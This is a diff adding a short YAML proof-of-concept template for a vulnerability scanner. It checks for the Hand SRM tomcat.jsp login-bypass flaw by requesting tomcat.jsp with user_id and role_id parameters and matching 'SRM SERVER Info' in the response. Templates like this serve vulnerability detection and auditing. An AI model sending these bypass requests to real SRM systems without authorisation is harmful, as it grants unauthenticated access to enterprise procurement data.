@@ -1,0 +1,23 @@
+name: poc-yaml-hand-tomcat-unauthorized
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /tomcat.jsp?dataName=user_id&dataValue=1
+            follow_redirects: true
+        expression: response.status == 200 && response.body_string.contains("SRM SERVER Info") && response.body_string.contains("user_id =")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /tomcat.jsp?dataName=role_id&dataValue=1
+            follow_redirects: true
+        expression: response.status == 200 && response.body_string.contains("SRM SERVER Info") && response.body_string.contains("role_id =")
+expression: r0() && r1()
+detail:
+    author: EASY
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E6%B1%89%E5%BE%97/%E6%B1%89%E5%BE%97SRM%20tomcat.jsp%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
